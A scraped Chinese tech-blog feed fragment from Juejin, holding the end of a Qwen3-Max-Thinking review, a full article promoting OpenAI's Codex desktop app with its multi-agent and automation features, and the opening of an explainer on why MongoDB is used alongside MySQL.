<p>还给出了错误答案。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9e15d8d004e474eb5d3a98eddacd948~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=Nw6rcOXtSevEVwHqfY%2B6nx%2B8vRI%3D" alt="图片" loading="lazy"/></p>
<p>特地翻译出来，看看gemini 3到底怎么错的。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/653b3b63564240e49320f71748b216f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=0s43AOCpjklwdxP%2BUU7h%2FX%2BHNnY%3D" alt="图片" loading="lazy"/></p>
<p>其实Gemini 3 pro一度接近正确思路，但是不知为何突然开始混乱了，</p>
<p>也许是因为还没有Qwen 3 pro一样，能懂得公务员考试的出题套路。</p>
<h3 data-id="heading-7">代码类：会喷火的旋转六边形小球</h3>
<p>似乎代码能力并没有那么好，试了一下GLM4.7能顺利跑出来的case，Qwen 3还是有瑕疵。</p>
<pre><code class="hljs language-css" lang="css">prompt：用 <span class="hljs-selector-tag">HTML</span>、CSS 和 JavaScript 实现这样一个效果：一个小球被困在一个旋转的六边形内部。小球受到地球重力的作用，并与六边形内壁产生摩擦。小球的弹跳需要看起来逼真自然。
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f37ecf61fb78497c827549d6f0e7fd3a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=TOSsYaLMPtIc6aCoY5R7CbFvLWQ%3D" alt="图片" loading="lazy"/></p>
<p>优点是，Qwen 3 自动帮我考虑到了可调节参数，能让我调节旋转速度、重置位置、暂停旋转等，下面还有参数显示。</p>
<p>缺点是，这个明显还有缺陷，小球会喷火。。</p>
<h2 data-id="heading-8">写在最后</h2>
<p>虽然 Qwen3-Max-Thinking 在代码场景下还有瑕疵，但整体表现还是非常不错的。</p>
<p>特别是在逻辑推理、信息检索和中文语境的理解上，它给人的感觉非常扎实。</p>
<p>不知道Qwen在春节还有没有什么压箱底的大招，再放出来，我们可以一起期待一下。毕竟阿里的技术还是非常强劲的~</p>
<p>我是袋鼠帝，一个在这个AI时代，持续分享AI实践干货，陪你一起进化的数字游民。</p>
<p>谢谢你耐心看完我的文章~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenAI 放大招：Codex 独立 App 上线，一次跑 10 个 AI Agent 帮你写代码]]></title>    <link>https://juejin.cn/post/7602177588443463699</link>    <guid>https://juejin.cn/post/7602177588443463699</guid>    <pubDate>2026-02-03T05:58:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602177588443463699" data-draft-id="7602211941513068598" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenAI 放大招：Codex 独立 App 上线，一次跑 10 个 AI Agent 帮你写代码"/> <meta itemprop="keywords" content="OpenAI,AIGC,AI编程"/> <meta itemprop="datePublished" content="2026-02-03T05:58:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="孟健AI编程"/> <meta itemprop="url" content="https://juejin.cn/user/4212984287073895"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenAI 放大招：Codex 独立 App 上线，一次跑 10 个 AI Agent 帮你写代码
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4212984287073895/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    孟健AI编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:58:07.000Z" title="Tue Feb 03 2026 05:58:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是孟健。</p>
<p><strong>OpenAI 终于把 IDE 扔了。</strong></p>
<p>昨天，OpenAI 发布了 Codex 桌面 App（macOS），不是插件，不是网页，是一个独立的 <strong>AI 编程指挥中心</strong>。你可以同时开 10 个 Agent，分别写前端、跑测试、修 CI、部署上线——然后你去喝杯咖啡，回来 review 代码就行。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a3f52d43f3f4b6cb11ce3e3194d9b41~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703087&amp;x-signature=UCtjlJhF3aUSO2h%2FSr7RPerJak8%3D" alt="" loading="lazy"/></p>
<p>Sam Altman 自己在发布会上说：<strong>"我做了一个大项目，几天时间，全程没打开过 IDE 。一次都没有。"</strong></p>
<p>我逆向过 Copilot，从 Copilot 到 Cursor 到 Claude Code 到 Codex，AI 编程工具我基本每一代都深度用过。今天聊聊这个 Codex App 到底意味着什么。</p>
<hr/>
<h2 data-id="heading-0">01 不是又一个编辑器插件</h2>
<p>先说清楚 Codex App 是什么、不是什么。</p>
<p><strong>不是</strong>：VS Code 插件、网页版 IDE、又一个聊天窗口</p>
<p><strong>是</strong>：一个管理多个 AI 编程 Agent 的桌面应用，类似"AI 程序员团队的项目管理工具"</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3436925349b04ee1816c7444f769cb85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703087&amp;x-signature=lgo7LyV2LyZg7WBtvayQmV4kQHs%3D" alt="" loading="lazy"/></p>
<p>核心变化：</p>
<ul>
<li>
<p><strong>多 Agent 并行</strong>：每个 Agent 跑在独立线程里，按项目分组，互不干扰</p>
</li>
<li>
<p><strong>Worktree 隔离</strong>：每个 Agent 在你代码仓库的独立副本上工作，不会搞乱你的 git 状态</p>
</li>
<li>
<p><strong>长时运行</strong>：Agent 可以跑几十分钟甚至几小时，你不用盯着</p>
</li>
<li>
<p><strong>Skills 系统</strong>：支持扩展技能包——Figma 设计稿转代码、Linear 项目管理、Cloudflare 部署，一键挂载</p>
</li>
<li>
<p><strong>Automations</strong>：定时任务，比如每天自动跑一遍测试、分类 issue、生成发布日报</p>
</li>
</ul>
<p>以前用 Copilot，是你写一行它补一行。用 Cursor，是你写一段它改一段。</p>
<p><strong>现在用 Codex App，是你说一句话，10 个 Agent 同时干 10 件事。</strong></p>
<p>这不是量变，是质变。</p>
<hr/>
<h2 data-id="heading-1">02 我最关注的三个细节</h2>
<h3 data-id="heading-2">细节一：Agent 可以"自己玩自己"</h3>
<p>OpenAI 在官方演示里让 Codex 做了一个赛车游戏——8 张地图、多个角色、道具系统。一个 prompt 发出去，Agent 自己当设计师、当开发者、当 QA 测试员，<strong>消耗了 700 万 tokens</strong>，全程只需要一次人类输入。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26697fd4041b4febbe929fd6c4cf7720~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703087&amp;x-signature=Iv2v2Pcs2JKAx4Yijmh1Yz0Vwtk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ccb26ac8aa143b1ba833dc58de96fba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703087&amp;x-signature=%2BryYr%2BDqMnyyaD%2BDSNtsb3imgtU%3D" alt="" loading="lazy"/></p>
<p>以前：写代码 → 手动测 → 发现 bug → 再写 → 再测</p>
<p>现在：写代码 → 自己测 → 自己修 → 交给你 review</p>
<p><strong>AI 编程正在从"结对编程"变成"团队管理"。</strong></p>
<h3 data-id="heading-3">细节二：Skills 生态——这才是护城河</h3>
<p>Codex App 内置了 Skills 系统，和 Claude Code 的 Skills、OpenClaw 的 Skills 本质上是同一个思路：<strong>把重复性工作打包成可复用的技能包</strong>。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26cf6f4f5f264408a3eef4d39686b2ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703087&amp;x-signature=eaitDlmy5WVTuxG6f2DpGwv%2BDhA%3D" alt="" loading="lazy"/></p>
<p>官方已经开源了一批：</p>
<ul>
<li>
<p><strong>Figma 设计稿实现</strong>：拉取设计上下文，1:1 还原 UI</p>
</li>
<li>
<p><strong>Linear 项目管理</strong>：自动分类 bug、跟踪发布、管理工作量</p>
</li>
<li>
<p><strong>云部署</strong>：一键推到 Cloudflare/Vercel/Netlify</p>
</li>
<li>
<p><strong>图片生成</strong>：用 GPT Image 生成网站素材、游戏资产</p>
</li>
<li>
<p><strong>文档处理</strong>：读写 PDF/Excel/Word</p>
</li>
</ul>
<p>OpenAI 内部已经用了几百个自定义 Skills 来处理日常工作——跑 eval、盯训练、写文档、统计增长数据。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c32de1e01560457a97f919ea5246b810~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703087&amp;x-signature=vutNyyseTJaguKeuOAazMpm93RQ%3D" alt="" loading="lazy"/></p>
<p><strong>谁的 Skills 生态更丰富，谁就赢。</strong> 这和手机应用商店是同一个逻辑。</p>
<h3 data-id="heading-4">细节三：Automations——AI 不下班</h3>
<p>这是我最兴奋的功能。你可以设置 Codex 定时执行任务：</p>
<ul>
<li>
<p>每天早上自动 triage 新 issue</p>
</li>
<li>
<p>每次 CI 失败自动分析原因并生成修复 PR</p>
</li>
<li>
<p>每周自动生成发布日报</p>
</li>
<li>
<p>定时检查代码质量，发现问题主动报警</p>
</li>
</ul>
<p><strong>以前 Agent 是你叫它才动。现在 Agent 是全年无休的员工。</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88f2708dc0b44b3794574a7de7e39999~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703087&amp;x-signature=tZWN6HvsYdDmuj3Y%2B%2BvTdNTQjuM%3D" alt="" loading="lazy"/></p>
<p>如果你用过 OpenClaw 的 cron + heartbeat 机制，会觉得这个思路很熟悉——AI Agent 的终局就是"不需要人触发，自己发现问题、自己解决问题"。</p>
<hr/>
<h2 data-id="heading-5">03 和 Claude Code 比，谁更强？</h2>
<p>说实话，这个问题目前没有标准答案。但我可以从几个维度给你一个参考：</p>













































<table><thead><tr><th>维度</th><th>Codex App</th><th>Claude Code</th></tr></thead><tbody><tr><td>多 Agent 并行</td><td>✅ 核心卖点，原生支持</td><td>⚠️ 通过 sub-agents 支持</td></tr><tr><td>Skills 生态</td><td>✅ 官方开源 + 社区</td><td>✅ 成熟，社区活跃</td></tr><tr><td>定时自动化</td><td>✅ 内置 Automations</td><td>⚠️ 需要 OpenClaw 等工具</td></tr><tr><td>模型能力</td><td>GPT-5.2-Codex( TerminalBench #1)</td><td>Claude Opus/Sonnet（SWE-bench 顶级）</td></tr><tr><td>价格</td><td>$20/月起（Plus），$200/月（Pro）</td><td>API 按量付费</td></tr><tr><td>平台</td><td>macOS（Windows 待发布）</td><td>macOS + Linux</td></tr><tr><td>安全沙箱</td><td>✅ 原生沙箱，权限可配</td><td>✅ 沙箱模式</td></tr></tbody></table>
<p><strong>我的判断：Codex App 在"管理多个 Agent"这件事上目前领先；Claude Code 在单 Agent 深度编程能力上依然最强。</strong></p>
<p>如果你的工作是"一次做很多小任务"——比如同时处理 5 个 bug fix、3 个 feature request——Codex App 更适合。</p>
<p>如果你的工作是"深入一个复杂系统做大重构"——Claude Code 的长上下文理解和代码推理能力目前更胜一筹。</p>
<p><strong>不要选边站。两个都用。</strong></p>
<hr/>
<h2 data-id="heading-6">04 对独立开发者意味着什么</h2>
<p>我现在创业做出海产品，团队精简到不能再精简。Codex App 这种"一个人指挥一个 AI 团队"的模式，对独立开发者来说是降维打击：</p>
<p><strong>以前</strong>：一个独立开发者 = 1 个人 <strong>现在</strong>：一个独立开发者 + Codex App = 1 个人 + 10 个 Agent = 一个小型开发团队</p>
<p>具体来说：</p>
<ol>
<li>
<p><strong>并行 开发</strong>：Agent A 写前端，Agent B 写后端 API，Agent C 写测试，同时进行</p>
</li>
<li>
<p><strong>自动化运维</strong>：CI/CD、issue 分类、代码审查全部交给 Automations</p>
</li>
<li>
<p><strong>跨项目管理</strong>：我有 9 个出海小站，以前切换项目上下文很痛苦，现在每个项目独立开 Agent</p>
</li>
</ol>
<p>Sam Altman 在发布会上说了一句话让我印象很深：<strong>"As fast as I can type in new ideas， that is the limit of what can get built。"</strong></p>
<p>翻译一下：<strong>你能想多快，就能做多快。瓶颈不再是编程能力，而是产品想象力。</strong></p>
<hr/>
<h2 data-id="heading-7">05 免费可试 + 用量翻倍</h2>
<p>最后说一个实际的：</p>
<ul>
<li>
<p><strong>ChatGPT Free 和 Go 用户</strong>：限时免费试用 Codex</p>
</li>
<li>
<p><strong>Plus/Pro/Business/Enterprise/Edu 用户</strong>：限时 rate limit 翻倍</p>
</li>
<li>
<p><strong>翻倍适用范围</strong>：App、CLI、IDE 插件、Cloud，全平台生效</p>
</li>
</ul>
<p>上个月已经有超过 <strong>100 万开发者</strong> 使用 Codex。GPT-5.2-Codex 是 OpenAI 有史以来被采用最快的模型。</p>
<p>如果你还没试过，现在是最好的时机。</p>
<hr/>
<p><strong>AI 编程的竞争已经从"谁的模型更聪明"变成了"谁让开发者更爽"。</strong></p>
<p>Copilot 教会了我们让 AI 补代码。Cursor 教会了我们让 AI 改代码。Claude Code 教会了我们让 AI 写代码。</p>
<p><strong>Codex App 要教会我们的是：让 AI 替你管一个团队。</strong></p>
<p>你准备好当 CTO 了吗？</p>
<hr/>
<p>如果这篇对你有帮助，欢迎点赞、收藏、关注，你的支持是我持续输出的动力 ✨</p>
<hr/>
<p>我的其他平台账号和开源项目在个人主页中，欢迎交流 🤝</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[有MySQL为什么还要有MongoDB？ MongoDB是什么？架构是怎么样的？]]></title>    <link>https://juejin.cn/post/7602243150158020635</link>    <guid>https://juejin.cn/post/7602243150158020635</guid>    <pubDate>2026-02-03T06:02:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602243150158020635" data-draft-id="7602206323460718643" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="有MySQL为什么还要有MongoDB？ MongoDB是什么？架构是怎么样的？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-03T06:02:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java编程爱好者"/> <meta itemprop="url" content="https://juejin.cn/user/819554264300154"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            有MySQL为什么还要有MongoDB？ MongoDB是什么？架构是怎么样的？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/819554264300154/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java编程爱好者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:02:02.000Z" title="Tue Feb 03 2026 06:02:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>你是一个程序员， 老板要你做个游戏平台，支撑十多亿游戏用户数据的写入和存储。</p>
<p>游戏用户包含多种字段，比如id, 装备、是否参与过节日活动等，功能不断迭代，需要支持扩展各种属性字段以及多维度查询。比如没参加过情人节活动的剑士有哪些？</p>
<p>那么问题就来了，你会选择使用什么，存储这么大量的游戏数据？</p>
<p>聊到存储，很容易想到可以使用MySQL数据库，将id、装备，活动等做成一个像excel的数据表。</p>
<p>为了支持多维度查询，我们需要为每个可能的属性都预留字段，甚至加上索引。比如预留春节、情人节活动等各种字段，但大多数角色并不会全部活动都参与，所以很多预留的字段都用不上，浪费空间。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96db418bdb404cd58175083a1cfb8c30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=4CoDDMzinQLi1ufJ2iRnJ8fLkAk%3D" alt="很多预留的字段都用不上" loading="lazy"/></p>
